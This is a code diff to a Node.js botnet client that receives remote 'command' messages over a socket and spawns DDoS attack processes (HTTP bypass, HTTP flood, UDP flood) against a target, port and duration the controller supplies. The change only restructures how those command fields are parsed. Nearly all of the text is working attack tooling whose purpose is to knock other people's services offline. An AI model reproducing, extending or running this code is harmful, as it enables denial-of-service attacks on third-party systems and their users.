@@ -10,12 +10,13 @@ socket.on("connect", () => {
 socket.on("command", (data) => {
     console.log("Command received:", data);
 
-    // HTTP-BYPASS 
-    if (data.details && data.details.method === ".http-bypass") {
-        const target = data.details.target;
-        const port = data.details.port;
-        const time = data.details.time;
+    const method = data.method;
+    const target = data.target;
+    const port = data.port;
+    const time = data.time;
 
+    // HTTP-BYPASS 
+    if (method === ".http-bypass") {
         console.log(`Starting attack: node http.js ${target} ${port} ${time}`);
 
         const attackProcess = spawn("node", ["http-bypass/http-bypass.js", target, port, time], {
@@ -33,11 +34,7 @@ socket.on("command", (data) => {
     }
 
     // HTTP-1    
-    else if (data.details && data.details.method === ".http1") {
-        const target = data.details.target;
-        const port = data.details.port;
-        const time = data.details.time;
-
+    else if (method === ".http1") {
         console.log(`Starting attack: node http.js ${target} ${port} ${time}`);
 
         const attackProcess = spawn("node", ["http/http.js", target, port, time], {
@@ -55,11 +52,7 @@ socket.on("command", (data) => {
     }
 
     // UDP BASIC
-    else if (data.details && data.details.method === ".udp") {
-        const target = data.details.target;
-        const port = data.details.port;
-        const time = data.details.time;
-
+    else if (method === ".udp") {
         console.log(`Starting attack: ./udp/udp ${target} ${port} ${time}`);
 
         const attackProcess = spawn("./udp/udp", [target, port, time], {
